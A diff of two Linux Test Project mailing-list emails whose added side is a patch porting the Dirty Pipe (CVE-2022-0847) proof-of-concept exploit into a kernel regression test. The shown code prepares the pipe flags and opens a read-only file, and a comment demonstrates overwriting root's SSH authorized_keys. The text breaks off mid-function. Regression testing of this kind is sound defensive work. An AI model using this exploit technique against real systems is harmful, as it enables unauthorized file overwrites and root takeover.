@@ -2,150 +2,90 @@ Return-Path: <ltp-bounces+lists+linux-ltp=lfdr.de@lists.linux.it>
 X-Original-To: lists+linux-ltp@lfdr.de
 Delivered-To: lists+linux-ltp@lfdr.de
 Received: from picard.linux.it (picard.linux.it [IPv6:2001:1418:10:5::2])
-	by mail.lfdr.de (Postfix) with ESMTPS id 80E99569F07
-	for <lists+linux-ltp@lfdr.de>; Thu,  7 Jul 2022 12:02:50 +0200 (CEST)
+	by mail.lfdr.de (Postfix) with ESMTPS id 48A36569EC7
+	for <lists+linux-ltp@lfdr.de>; Thu,  7 Jul 2022 11:43:50 +0200 (CEST)
 Received: from picard.linux.it (localhost [IPv6:::1])
-	by picard.linux.it (Postfix) with ESMTP id 529833C95FF
-	for <lists+linux-ltp@lfdr.de>; Thu,  7 Jul 2022 12:02:50 +0200 (CEST)
+	by picard.linux.it (Postfix) with ESMTP id 5DF333C934D
+	for <lists+linux-ltp@lfdr.de>; Thu,  7 Jul 2022 11:43:49 +0200 (CEST)
 X-Original-To: ltp@lists.linux.it
 Delivered-To: ltp@picard.linux.it
-Received: from in-2.smtp.seeweb.it (in-2.smtp.seeweb.it
- [IPv6:2001:4b78:1:20::2])
+Received: from in-3.smtp.seeweb.it (in-3.smtp.seeweb.it
+ [IPv6:2001:4b78:1:20::3])
  (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
  key-exchange X25519 server-signature ECDSA (P-384))
  (No client certificate requested)
- by picard.linux.it (Postfix) with ESMTPS id 302183C8CB2
- for <ltp@lists.linux.it>; Thu,  7 Jul 2022 12:02:49 +0200 (CEST)
-Received: from esa10.fujitsucc.c3s2.iphmx.com (esa10.fujitsucc.c3s2.iphmx.com
- [68.232.159.247])
+ by picard.linux.it (Postfix) with ESMTPS id 091993C071B
+ for <ltp@lists.linux.it>; Thu,  7 Jul 2022 11:43:42 +0200 (CEST)
+Received: from mail1.bemta37.messagelabs.com (mail1.bemta37.messagelabs.com
+ [85.158.142.112])
  (using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
  (No client certificate requested)
- by in-2.smtp.seeweb.it (Postfix) with ESMTPS id 3089B60123B
- for <ltp@lists.linux.it>; Thu,  7 Jul 2022 12:02:47 +0200 (CEST)
-DKIM-Signature: v=1; a=rsa-sha256; c=simple/simple;
- d=fujitsu.com; i=@fujitsu.com; q=dns/txt; s=fj1;
- t=1657188168; x=1688724168;
- h=from:to:cc:subject:date:message-id:references:
- in-reply-to:content-id:content-transfer-encoding: mime-version;
- bh=P7fQRURTjL7VTwzofD0Mxo3otLGbsSVKU/VLi12dCkY=;
- b=m9oGwHLxOxOwZEhRrOSFrr7uQuanBfOcpTVi9HhnuZQ+ewUP9RpYX7+d
- FpAWv4BR6rdCbIN37F+iMPkAxTEadt/HtfOMlJ+rC81F2juL3oHYC69ok
- Jfe75l7/dPSGZ1egois5TpDok6KDR9ZOJ67sCt9Gz7rmBWZyBmNA+P4no
- CNiT6Mc6fK+HgxkkynvmJP3aGODdXNuVKwyTcBhBQo/OPGZy3S2jtwRjX
- 5PVu7n9lJxsfLDm92/2rkoRZa2UorCfz0RQZE3+ojjlPzdVYozUBs/hte
- yopxHrlro3QGyjc98Opr8G4fG4JiOVtqhVboERIu82hyeQIRYLPXRJoIn g==;
-X-IronPort-AV: E=McAfee;i="6400,9594,10400"; a="59980381"
-X-IronPort-AV: E=Sophos;i="5.92,252,1650898800"; d="scan'208";a="59980381"
-Received: from mail-tycjpn01lp2172.outbound.protection.outlook.com (HELO
- JPN01-TYC-obe.outbound.protection.outlook.com) ([104.47.23.172])
- by ob1.fujitsucc.c3s2.iphmx.com with ESMTP/TLS/ECDHE-RSA-AES256-GCM-SHA384;
- 07 Jul 2022 19:02:45 +0900
-ARC-Seal: i=1; a=rsa-sha256; s=arcselector9901; d=microsoft.com; cv=none;
- b=mACJi8/OjsN3wmAJYQ+wpnTUZtBnCMWz39z3yFiPd2VoEoRaQp4FvjF8PYJgZKU1T1FSvTCd5y2jEOtmgWCjXbeJeUpX556Ap45HcalIX8yQFqs/WtFbDyxZDN9uoikPlQD4uXFSpBhjrdkNK7eCKBk40oekqwaC4tfREbINK0PdTzxoQn1QcN99DPhDdwAtMLQOfP7fzznf50No2rHln3udObn6viU5ff5xw67o2r8/X/wW1gilQEF3/A6MPCi0bSqNe2ijiyxFil/Mc+1NbRyZw9dmWBb2pDwgwc7fWjLZtRbdFfInIxuPLgXPnwYVtec38WOoCy6PV1Z6uCbyzQ==
-ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com; 
- s=arcselector9901;
- h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
- bh=P7fQRURTjL7VTwzofD0Mxo3otLGbsSVKU/VLi12dCkY=;
- b=LICRJ6B6+YfF+3qAaeyJ5TazIOUXrVQYTvOn0E21FDgQgU1HxfiDoBT5OdTkUagf/7fpAblTkCIm9v1fs3igerVpWvg726pWnhnLg3bt8NRPWUjEgBbjthO7HOtSJsoR0J98s8QlW6hD1WDEW91TPQQWP5tbsrb0jI7dbOHOT60B0sGX2kCw07U2P+gipAa28BzCgA9Tmug98OUMQbAgIx32x9ffvYzwo6m77hd3j/EB4B2j6HftnHQbi9ywPT+3B56SqAlEiIi5XI8FyKOcmanUBX1o9amWjvAcvnJ7ypCO4neg4gJ20ctdZVrAfaGHEbhg6EedeFD8TdRGbOALEw==
-ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
- smtp.mailfrom=fujitsu.com; dmarc=pass action=none header.from=fujitsu.com;
- dkim=pass header.d=fujitsu.com; arc=none
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
- d=fujitsu.onmicrosoft.com; s=selector2-fujitsu-onmicrosoft-com;
- h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
- bh=P7fQRURTjL7VTwzofD0Mxo3otLGbsSVKU/VLi12dCkY=;
- b=mzYz7eFR/NCgbaGD9CQVEMiO2/twjYstD4rwjN+Mn43MOLhKM/ncExGxu4+wiRxUtVN0uQi/4pTZZfEHWLq7Eam4BOLUuodY0w4LzWJRUNkD4uLDMZZQiNhsmYpD3luhyfOIJVDbBAPXR4Mp7gY7zvsaQ+BfsMzn/sDUor2vSrI=
-Received: from TY2PR01MB4427.jpnprd01.prod.outlook.com (2603:1096:404:10d::20)
- by TYWPR01MB9509.jpnprd01.prod.outlook.com (2603:1096:400:19a::11)
- with Microsoft SMTP Server (version=TLS1_2,
- cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.20.5395.14; Thu, 7 Jul
- 2022 10:02:43 +0000
-Received: from TY2PR01MB4427.jpnprd01.prod.outlook.com
- ([fe80::fd30:6d2d:85fb:8160]) by TY2PR01MB4427.jpnprd01.prod.outlook.com
- ([fe80::fd30:6d2d:85fb:8160%5]) with mapi id 15.20.5395.021; Thu, 7 Jul 2022
- 10:02:43 +0000
-From: "xuyang2018.jy@fujitsu.com" <xuyang2018.jy@fujitsu.com>
-To: Li Wang <liwang@redhat.com>
-Thread-Topic: [LTP] [PATCH] mountns01: wait for umount completed in thread_b
-Thread-Index: AQHYkeVvpj1To9Ct0UKVzebBFftbFq1yvqUA
-Date: Thu, 7 Jul 2022 10:02:43 +0000
-Message-ID: <62C6BD8E.10802@fujitsu.com>
-References: <20220707093845.946230-1-liwang@redhat.com>
-In-Reply-To: <20220707093845.946230-1-liwang@redhat.com>
-Accept-Language: zh-CN, en-US
-Content-Language: en-US
-X-MS-Has-Attach: 
-X-MS-TNEF-Correlator: 
-authentication-results: dkim=none (message not signed)
- header.d=none;dmarc=none action=none header.from=fujitsu.com;
-x-ms-publictraffictype: Email
-x-ms-office365-filtering-correlation-id: a483397b-e5cd-453d-4e82-08da5fffd5da
-x-ms-traffictypediagnostic: TYWPR01MB9509:EE_
-x-ms-exchange-senderadcheck: 1
-x-ms-exchange-antispam-relay: 0
-x-microsoft-antispam: BCL:0;
-x-microsoft-antispam-message-info: SECSKH6UAvJnRuqIoB7t/Ja0V5h+M7hXZ66dryuTOuM8ewmZH3HYgdM5Hz5zAbYIzHTf/lc8o2mZK1IoRPkNEepZ4jQSko+Uz6lGHXO7/ZLqNhKT6RuWl+R7K2iBIfHSGpCpENAkvjbBfBq4T8IiGXq7Np9ulj+Jy+QFabQVdlxXeCtFf0iteuYWAt67lcJXWJZVYVyNr+aQ1rX4rTONzT6/uhcZ78OkSrDWb14Gvh7xDEvvCXggfzkvg1qoyoiBfQZBRAkWL4u9p/VxYyZiB9G3dWY49emtOfyfaJM1jnRDuAFy4uZAfbyKeX66w2uoO8cuKp7P9Uk1xwzTo3/wTOfUOXWjB6jnIb1NaMGi2ip5G6ob4Um8ITND3eBNXDR4OG0ft5nZDqGALa095BnR58aS7EsuvDRNS4nTBrNB/gt+l0MSpsQx2plN4UU8M77GuTcOHjs9X+koIZNafcxzENd7ZDOt3TWGMulB5p0C1T7NCU31cM697iQF6Cip1HL7PlKYYIesBqeyuftH11KMCoNwi6p7qNRHuiPOUIzIPvJoePjpP8TfN6FDofB/n9KUasBt+QyTuCDxcZVgs+NVmVCrxmXwfYvF6xV5+7PlKVMYX5JjgE4z9r3M1qGu5zIeHsRIdtkIK7HwVDEK9NZy88SvItdWttAG3o5kQraHNaOH715Of5nXzf9p58vw70pMmJaps4OAq1S5ER1BpzFt56O+f4mVmwmKasyDIkofKCpRw9wnJEe5EWcW8o/qAAH2T08x43Cr1A/xRIa3PZegku4zM/zaRtgE7N4RD2gnKY7wC4PcfNEhJi070/snKfaK
-x-forefront-antispam-report: CIP:255.255.255.255; CTRY:; LANG:en; SCL:1; SRV:;
- IPV:NLI; SFV:NSPM; H:TY2PR01MB4427.jpnprd01.prod.outlook.com; PTR:; CAT:NONE;
- SFS:(13230016)(4636009)(346002)(366004)(39860400002)(376002)(396003)(136003)(478600001)(64756008)(76116006)(316002)(91956017)(8676002)(5660300002)(6506007)(66946007)(66476007)(66556008)(6486002)(6916009)(66446008)(8936002)(71200400001)(4326008)(2906002)(38100700002)(86362001)(38070700005)(85182001)(33656002)(36756003)(26005)(122000001)(6512007)(2616005)(41300700001)(186003)(82960400001);
- DIR:OUT; SFP:1101; 
-x-ms-exchange-antispam-messagedata-chunkcount: 1
-x-ms-exchange-antispam-messagedata-0: =?gb2312?B?a1ZoVzJrb0RXbXBRS1pFc1ozNTBaVWFvL1lxQU5sUFRGQ1hpdjJ5WVNNNVFN?=
- =?gb2312?B?ZURxOWhJa2VQSFo4bmFQdjZrOWlpbEl5bnE2Z09lWmR1eitHL2JoRGpDVXpN?=
- =?gb2312?B?ckIxQ0tCS3Y2eWs0c281a3JKOW5mckg0djNhTXkwVG9NamJxUDhsRHQ4N0FS?=
- =?gb2312?B?YW9JNnp3RnRBdllNaWJOL1Z6aEJacTFuaDZuREY0aStzWlpaM1ZPTlQ4b0Mv?=
- =?gb2312?B?eTF2dmkvZVgrWVJPcG1obHYrMG82emRQbmFvTllYN0ZBWGpjdEVWSDlQT2Jo?=
- =?gb2312?B?WWM3Q3JIV3cxQVRDa1E4RTV1a3pmbHRIVmovKzgwNjIwRUcwZWUzQmthM2Y3?=
- =?gb2312?B?b1lYTmFpdktMN2hzQlZVTUpoOFdKU0NvZElhSmVmQXR1czVXalBCNU00aGlD?=
- =?gb2312?B?SW80Mk00VG9uQ1A1UlZMdDYyNE9tbW5VTU44L0pCSTU0VTFVeVZBSmd3NU5t?=
- =?gb2312?B?T0FrZ285aEJqSVFWL29tc3AzVXhldmdxcE1kb1ZvZGF0azIxWmUyN1hwb2hP?=
- =?gb2312?B?eHpnZ2xJQ1pJSy9uVmRTZFBtWkRqamxycDhvWlNKNVBEdUpWWWx2cmFwbkF3?=
- =?gb2312?B?cmZ6Ymg4YzBxSUhMREt0MFFLV0V1aE53bUFkdHlkK0M0Yis0Z3I2bFNLUWYv?=
- =?gb2312?B?UjVMUWtnZmI2UDZhMFRydWJHZXZUanY5dWVUM2ZGTnFPRFhuRVFXUGpWTC95?=
- =?gb2312?B?eEg5UjIrUXprcE5aMjBLenYyL2NMMW9mNTdOY281bndZUFBXSDNUenczNm1s?=
- =?gb2312?B?YkhKR2ZITEgvME9RQjNSazVDUEdJNWFkUllVTk5RajBEdlo4YkFqVUtWbkIr?=
- =?gb2312?B?VlVhUTAwOXNjT2tkSmZxWlNSemozQnpxMWtCN0t2WitMUXhqSkdDTU01Z09y?=
- =?gb2312?B?YmZKSkZZek9xSkdtSGk0QlNKTUFiUExaeVhyMHI3bFN0UWM2b2NiUDlXVmVS?=
- =?gb2312?B?VUl1VHRtUkpXQW1LZVBpY216OXNSOHJTZmdpZVZUWnVudTViN2Z2dUplRzVj?=
- =?gb2312?B?aEQ4OVhqSDVHYVNieFgwYkhhWUU1S2ZBVHIxaDdza2JnQlNpVFNlYUhWSWF6?=
- =?gb2312?B?R3NPMm40V2c1anNmSnJWUnNXRXYxTncyTUZIODdvRmY2NWM1RzJHWEMyamxJ?=
- =?gb2312?B?eDh5Y2ZCazY0U3JoMmpRVUtQdk9YRzhkNHdJYUFFbnNBUWROT2FXZ2JhQmJw?=
- =?gb2312?B?MHBrZXQwU1BIcVZEWkx1Mmloc1QyTktRbE5ndlRFdksxTEdFbEVFTSt6MjND?=
- =?gb2312?B?TnNtRFRIcC9Dc3c0SDh4a0IzRHdjVEdFMGhNVkw2UUJ0RFp5dTd2cmpqbEhI?=
- =?gb2312?B?ZWljM3N3aUlMR0JKSVlETk5Ea0Erb3F5RzFKem1SOXdlbzVyYy80eWIrMitn?=
- =?gb2312?B?R0NaZlR0b2x3TTFHLytwWGZJY1VoNFV3VmloUmFrS2lSdWFPd1ppUC9sSE5j?=
- =?gb2312?B?NGFKTGhZeHBRbE9QZ0ZGQ2g3ZXJZRWZIVDZreklpYWkxOWlURHRUN3ZJOG5i?=
- =?gb2312?B?UkJPUWJwNysvMWdienVIQTdDb1ZzUld3OG15bUhIcUJZZ2NsdmRTRXRBVTk1?=
- =?gb2312?B?dFY4eS92UlZ6MDVYcmYwTkx6OHJWNGgrM1U1anJvNHNoNnFWOXl6VmdjVVhs?=
- =?gb2312?B?NXJVVzdpUGw2eXh5bGUzU05zRkxsNFI1OGpMWHhJcnd3NXdHQzgxNVd4cVVR?=
- =?gb2312?B?cEtWTjlsek54YisyYXpETzFYQUZkZlhWM1RiSFhLR2wyRzBjcmRIVTM2RVcw?=
- =?gb2312?B?Z1VXaUlPT1dNNUIvVnk0S0xqcXd5MHZHWFMvZk5NaE91SGsyMnJNUERKMTlx?=
- =?gb2312?B?NmUyRmlPMVQxbmdvVXZJVWZIcHZtK24yZHE1dk1lVkM4MlNYdUVSTklkZlVM?=
- =?gb2312?B?RTZyRXZZeVZ4ZTVzZ2ZSenMxY0wzZGVnMUZQSmVROGp2SUZHWlcwejNHdlBr?=
- =?gb2312?B?cnU1K1paMFNuc1JUdWNOdk1aRXhkTk5IVVB4RnJCR3Qzck44aVNFbGI5UWpR?=
- =?gb2312?B?bjBpMWwrVG5qQXBpR0tSUXJHOTVReFZWcHc3ZDY1S2hvaGdwWEFNcDNualhl?=
- =?gb2312?B?MVRsM3dHeUJidy9XRW1La0hXRjlNdWMrZkdDbzRPdDNOK2NUWnJKb0RrMnh6?=
- =?gb2312?B?QW1sTXV2K1hSTEdtbElKTWpkdmh5SHh5NGtGTGhla0hjVE1nbzZNREw5bWVQ?=
- =?gb2312?B?Y3c9PQ==?=
-Content-ID: <A20B826B6A78AA48AB761817EEBFC552@jpnprd01.prod.outlook.com>
+ by in-3.smtp.seeweb.it (Postfix) with ESMTPS id D33951A006EF
+ for <ltp@lists.linux.it>; Thu,  7 Jul 2022 11:43:40 +0200 (CEST)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=fujitsu.com;
+ s=170520fj; t=1657187019; i=@fujitsu.com;
+ bh=t0PJ5GaiJ6ZIyjNm3jJunjqfw4K0Y3LRl7aPH2Q2U7w=;
+ h=From:To:CC:Subject:Date:Message-ID:MIME-Version:Content-Type;
+ b=phwSthF5Nuyw+Ia8OP1NECcZ/CqHJIkh+VkFIIigJx/V9yYHYC1AWz7At6ojMMRVJ
+ lILpztNC00Dn7Ab3yij0CzoQw5WcDANb1Hp9sTkXwJITcbu5fbzcx9kGlqk1Vn+9Qp
+ 9oys8gRWq0skI5cxdCY5EtE8j7FE4gmQW8m5sl8nPW1S7dVoL3dRGF0cr8reS5vM9g
+ QL1dkLo/LBmp33VpxWvQq/KiwsLMbh19WdmIsLzCqFRJxjHBsng3Yr2YtfZo5zr2cq
+ 3Ak2VXe+7ro6yEx4xQjjqTd2Gl9p0yRLL4irjSbu6LCc6y10/Kc2t77x7jMT2A+DGW
+ HiBTBERj58yHg==
+X-Brightmail-Tracker: H4sIAAAAAAAAA+NgFrrEIsWRWlGSWpSXmKPExsViZ8ORqHt61bE
+ kg/ebuSxWfN/B6MDose/3OtYAxijWzLyk/IoE1oyzy8+wFay3qHgy5z5bA2OPfhcjF4eQwFlG
+ ic7nt5kgnANMEq8al0I5uxklevafZeli5ORgE9CUeNa5gBnEFhGQkOhoeMsOYjMLqEssn/QLq
+ IGDQ1jAXmLvHmWQMIuAisT7M5eZQGxeAQ+J6Zf3sYHYEgIKElMevmeGiAtKnJz5hAVijITEwR
+ cvmCFqFCUudXxjhLArJF4fvgQVV5O4em4T8wRG/llI2mchaV/AyLSK0SapKDM9oyQ3MTNH19D
+ AQNfQ0FTX0hJIWeolVukm6qWW6ublF5Vk6BrqJZYX66UWF+sVV+Ym56To5aWWbGIEBmZKcXL5
+ Dsbt+37pHWKU5GBSEuVlXn4sSYgvKT+lMiOxOCO+qDQntfgQowwHh5IEb9FKoJxgUWp6akVaZ
+ g4wSmDSEhw8SiK8U1cApXmLCxJzizPTIVKnGO05FvZf3cvMMXX2v/3MHMvB5MyvbQeYhVjy8v
+ NSpcR5bUDaBEDaMkrz4IbCovoSo6yUMC8jAwODEE9BalFuZgmq/CtGcQ5GJWHeNJApPJl5JXC
+ 7XwGdxQR01rL8IyBnlSQipKQamKLvJMsrVIi8rtCdNnOBXtsFLvG8Y6LPmyr3Gvyo3fTSftnG
+ 1r0GEVtbet5vvrBfIuLo24dbvrm8cuh2vyVX5a50yiKl+W2g30YB858+KQsjWS6eNvqUP3EDj
+ xvjw3tbN+VPnpeYUHuhx6BjgWv2VIV3R5Yd8nPJWhujGSB9udhoZ77+BQWh/mthdYvffbmpVc
+ QarZ7Z4vTm0+IPHFJfn+64fd7rW+YNN83z9x/H7mR06uQOTku0L2a/nZP989Ri1Z2ZcjwR97p
+ 5bQ9yOrBOt7let/qaKZfZ5SiL7m2TVX6JOkZsOvLOdPLWfg+LPSvKAxljF+kw5RwPcA7VLDJq
+ PJT48c7qn06erBrhrkunKbEUZyQaajEXFScCAFpB5MFlAwAA
+X-Env-Sender: xuyang2018.jy@fujitsu.com
+X-Msg-Ref: server-13.tower-732.messagelabs.com!1657187018!76099!1
+X-Originating-IP: [62.60.8.97]
+X-SYMC-ESS-Client-Auth: outbound-route-from=pass
+X-StarScan-Received: 
+X-StarScan-Version: 9.86.8; banners=-,-,-
+X-VirusChecked: Checked
+Received: (qmail 12214 invoked from network); 7 Jul 2022 09:43:39 -0000
+Received: from unknown (HELO n03ukasimr01.n03.fujitsu.local) (62.60.8.97)
+ by server-13.tower-732.messagelabs.com with ECDHE-RSA-AES256-GCM-SHA384
+ encrypted SMTP; 7 Jul 2022 09:43:39 -0000
+Received: from n03ukasimr01.n03.fujitsu.local (localhost [127.0.0.1])
+ by n03ukasimr01.n03.fujitsu.local (Postfix) with ESMTP id 886C7100190
+ for <ltp@lists.linux.it>; Thu,  7 Jul 2022 10:43:38 +0100 (BST)
+Received: from R01UKEXCASM126.r01.fujitsu.local (R01UKEXCASM126
+ [10.183.43.178])
+ (using TLSv1.2 with cipher ECDHE-RSA-AES256-SHA384 (256/256 bits))
+ (No client certificate requested)
+ by n03ukasimr01.n03.fujitsu.local (Postfix) with ESMTPS id 7C10A100043
+ for <ltp@lists.linux.it>; Thu,  7 Jul 2022 10:43:38 +0100 (BST)
+Received: from localhost.localdomain (10.167.220.84) by
+ R01UKEXCASM126.r01.fujitsu.local (10.183.43.178) with Microsoft SMTP Server
+ (TLS) id 15.0.1497.32; Thu, 7 Jul 2022 10:43:36 +0100
+From: Yang Xu <xuyang2018.jy@fujitsu.com>
+To: <ltp@lists.linux.it>
+Date: Thu, 7 Jul 2022 18:44:27 +0800
+Message-ID: <1657190667-2220-1-git-send-email-xuyang2018.jy@fujitsu.com>
+X-Mailer: git-send-email 1.8.3.1
 MIME-Version: 1.0
-X-OriginatorOrg: fujitsu.com
-X-MS-Exchange-CrossTenant-AuthAs: Internal
-X-MS-Exchange-CrossTenant-AuthSource: TY2PR01MB4427.jpnprd01.prod.outlook.com
-X-MS-Exchange-CrossTenant-Network-Message-Id: a483397b-e5cd-453d-4e82-08da5fffd5da
-X-MS-Exchange-CrossTenant-originalarrivaltime: 07 Jul 2022 10:02:43.5030 (UTC)
-X-MS-Exchange-CrossTenant-fromentityheader: Hosted
-X-MS-Exchange-CrossTenant-id: a19f121d-81e1-4858-a9d8-736e267fd4c7
-X-MS-Exchange-CrossTenant-mailboxtype: HOSTED
-X-MS-Exchange-CrossTenant-userprincipalname: W4UMWI6dGlwK+nTwogM0WUM3XKnOfFwq3/siokE1eP9kURevNir39uPu6K1Tp3B7W42VRiTvxIp3yy1sCSa9Fzo+AHmo7L7bQu1kP5CHHV0=
-X-MS-Exchange-Transport-CrossTenantHeadersStamped: TYWPR01MB9509
-X-Virus-Scanned: clamav-milter 0.102.4 at in-2.smtp.seeweb.it
+X-Originating-IP: [10.167.220.84]
+X-ClientProxiedBy: G08CNEXCHPEKD08.g08.fujitsu.local (10.167.33.83) To
+ R01UKEXCASM126.r01.fujitsu.local (10.183.43.178)
+X-Virus-Scanned: clamav-milter 0.102.4 at in-3.smtp.seeweb.it
 X-Virus-Status: Clean
 X-Spam-Status: No, score=0.1 required=7.0 tests=DKIM_SIGNED,DKIM_VALID,
- DKIM_VALID_AU,DKIM_VALID_EF,SPF_HELO_PASS,SPF_PASS,
+ DKIM_VALID_AU,DKIM_VALID_EF,SPF_HELO_NONE,SPF_PASS,
  T_SCC_BODY_TEXT_LINE autolearn=disabled version=3.4.4
-X-Spam-Checker-Version: SpamAssassin 3.4.4 (2020-01-24) on in-2.smtp.seeweb.it
-Subject: Re: [LTP] [PATCH] mountns01: wait for umount completed in thread_b
+X-Spam-Checker-Version: SpamAssassin 3.4.4 (2020-01-24) on in-3.smtp.seeweb.it
+Subject: [LTP] [PATCH] security/dirtypipe: Add test for CVE-2022-0847
 X-BeenThere: ltp@lists.linux.it
 X-Mailman-Version: 2.1.29
 Precedence: list
@@ -157,78 +97,270 @@ List-Post: <mailto:ltp@lists.linux.it>
 List-Help: <mailto:ltp-request@lists.linux.it?subject=help>
 List-Subscribe: <https://lists.linux.it/listinfo/ltp>,
  <mailto:ltp-request@lists.linux.it?subject=subscribe>
-Cc: "ltp@lists.linux.it" <ltp@lists.linux.it>
 Content-Type: text/plain; charset="us-ascii"
 Content-Transfer-Encoding: 7bit
 Errors-To: ltp-bounces+lists+linux-ltp=lfdr.de@lists.linux.it
 Sender: "ltp" <ltp-bounces+lists+linux-ltp=lfdr.de@lists.linux.it>
 
-Hi Li
+Fixes: #921
+Signed-off-by: Yang Xu <xuyang2018.jy@fujitsu.com>
+---
+ runtest/cve                                   |   1 +
+ runtest/syscalls                              |   1 +
+ .../kernel/security/dirtypipe/.gitignore      |   1 +
+ testcases/kernel/security/dirtypipe/Makefile  |   6 +
+ .../kernel/security/dirtypipe/dirtypipe.c     | 195 ++++++++++++++++++
+ 5 files changed, 204 insertions(+)
+ create mode 100644 testcases/kernel/security/dirtypipe/.gitignore
+ create mode 100644 testcases/kernel/security/dirtypipe/Makefile
+ create mode 100644 testcases/kernel/security/dirtypipe/dirtypipe.c
 
-We can also use TST_CHECKPOINT_WAKE_AND_WAIT(0) again,
-but use SAFE_WAIT(NULL) is easier.
+diff --git a/runtest/cve b/runtest/cve
+index eaaaa19d7..9ab6dc282 100644
+--- a/runtest/cve
++++ b/runtest/cve
+@@ -72,5 +72,6 @@ cve-2021-4034 execve06
+ cve-2021-22555 setsockopt08 -i 100
+ cve-2021-26708 vsock01
+ cve-2021-22600 setsockopt09
++cve-2022-0847 dirtypipe
+ # Tests below may cause kernel memory leak
+ cve-2020-25704 perf_event_open03
+diff --git a/runtest/syscalls b/runtest/syscalls
+index a0935821a..efef18136 100644
+--- a/runtest/syscalls
++++ b/runtest/syscalls
+@@ -1035,6 +1035,7 @@ process_vm_writev02 process_vm_writev02
+ 
+ prot_hsymlinks prot_hsymlinks
+ dirtyc0w dirtyc0w
++dirtypipe dirtypipe
+ 
+ pselect01 pselect01
+ pselect01_64 pselect01_64
+diff --git a/testcases/kernel/security/dirtypipe/.gitignore b/testcases/kernel/security/dirtypipe/.gitignore
+new file mode 100644
+index 000000000..fdf39eed2
+--- /dev/null
++++ b/testcases/kernel/security/dirtypipe/.gitignore
+@@ -0,0 +1 @@
++/dirtypipe
+diff --git a/testcases/kernel/security/dirtypipe/Makefile b/testcases/kernel/security/dirtypipe/Makefile
+new file mode 100644
+index 000000000..5ea7d67db
+--- /dev/null
++++ b/testcases/kernel/security/dirtypipe/Makefile
+@@ -0,0 +1,6 @@
++# SPDX-License-Identifier: GPL-2.0-or-later
++
++top_srcdir		?= ../../../..
++
++include $(top_srcdir)/include/mk/testcases.mk
++include $(top_srcdir)/include/mk/generic_leaf_target.mk
+diff --git a/testcases/kernel/security/dirtypipe/dirtypipe.c b/testcases/kernel/security/dirtypipe/dirtypipe.c
+new file mode 100644
+index 000000000..dfe7f5985
+--- /dev/null
++++ b/testcases/kernel/security/dirtypipe/dirtypipe.c
+@@ -0,0 +1,195 @@
++// SPDX-License-Identifier: GPL-2.0
++/*
++ * Copyright 2022 CM4all GmbH / IONOS SE
++ *
++ * Author: Max Kellermann <max.kellermann@ionos.com>
++ *
++ * Ported into ltp by Yang Xu <xuyang2018.jy@fujitsu.com>
++ */
++
++/*\
++ * [Description]
++ *
++ * Proof-of-concept exploit for the Dirty Pipe
++ * vulnerability (CVE-2022-0847) caused by an uninitialized
++ * "pipe_buffer.flags" variable.  It demonstrates how to overwrite any
++ * file contents in the page cache, even if the file is not permitted
++ * to be written, immutable or on a read-only mount.
++ *
++ * This exploit requires Linux 5.8 or later; the code path was made
++ * reachable by commit f6dd975583bd ("pipe: merge
++ * anon_pipe_buf*_ops").  The commit did not introduce the bug, it was
++ * there before, it just provided an easy way to exploit it.
++ *
++ * There are two major limitations of this exploit: the offset cannot
++ * be on a page boundary (it needs to write one byte before the offset
++ * to add a reference to this page to the pipe), and the write cannot
++ * cross a page boundary.
++ *
++ * Example: ./write_anything /root/.ssh/authorized_keys 1 $'\nssh-ed25519 AAA......\n'
++ *
++ * Further explanation: https://dirtypipe.cm4all.com/
++ */
++
++#ifndef _GNU_SOURCE
++#define _GNU_SOURCE
++#endif
++#include <unistd.h>
++#include <fcntl.h>
++#include <stdio.h>
++#include <stdlib.h>
++#include <string.h>
++#include <sys/stat.h>
++#include <sys/user.h>
++#include "tst_test.h"
++
++#define TEXT "AAAAAAAABBBBBBBB"
++#define TESTFILE "testfile"
++#define CHUNK 64
++#define BUFSIZE 4096
++
++static int p[2] = {-1, -1}, fd = -1, page_size;
++static char *write_buf, *read_buf;
++
++static void check_file_contents(void)
++{
++	SAFE_LSEEK(fd, 0, SEEK_SET);
++	SAFE_READ(1, fd, read_buf, 4096);
++
++	if (memcmp(write_buf, read_buf, 4096) != 0)
++		tst_res(TFAIL, "read buf data mismatch, bug exists");
++	else
++		tst_res(TPASS, "read buff data match, bug doesn't exist");
++}
++
++/*
++ * Create a pipe where all "bufs" on the pipe_inode_info ring have the
++ * PIPE_BUF_FLAG_CAN_MERGE flag set.
++ */
++static void prepare_pipe(void)
++{
++	unsigned int pipe_size, total, n, len;
++	char buffer[BUFSIZE];
++
++	SAFE_PIPE(p);
++	pipe_size = SAFE_FCNTL(p[1], F_GETPIPE_SZ);
++
++	/*
++	 * fill the pipe completely; each pipe_buffer will now have the
++	 * PIPE_BUF_FLAG_CAN_MERGE flag
++	 */
++	for (total = pipe_size; total > 0;) {
++		n = total > sizeof(buffer) ? sizeof(buffer) : total;
++		len = SAFE_WRITE(1, p[1], buffer, n);
++		total -= len;
++	}
++
++	/*
++	 * drain the pipe, freeing all pipe_buffer instances (but leaving the
++	 * flags initialized)
++	 */
++	for (total = pipe_size; total > 0;) {
++		n = total > sizeof(buffer) ? sizeof(buffer) : total;
++		len = SAFE_READ(1, p[0], buffer, n);
++		total -= len;
++	}
++
++	/*
++	 * the pipe is now empty, and if somebody adds a new pipe_buffer
++	 * without initializing its "flags", the buffe wiill be mergeable
++	 */
++}
++
++static void run(void)
++{
++	off_t offset;
++	int data_size, len;
++	struct stat st;
++	ssize_t nbytes;
++	loff_t next_page, end_offset;
++
++	offset = 1;
++	data_size = strlen(TEXT);
++	next_page = (offset | (page_size - 1)) + 1;
++	end_offset = offset + (loff_t)data_size;
++	if (end_offset > next_page)
++		tst_brk(TFAIL, "Sorry, cannot write across a page boundary");
++
++	fd = SAFE_OPEN(TESTFILE, O_RDONLY);
++	SAFE_FSTAT(fd, &st);
++
++	if (offset > st.st_size)
++		tst_brk(TFAIL, "Offset is not inside the file");
++	if (end_offset > st.st_size)
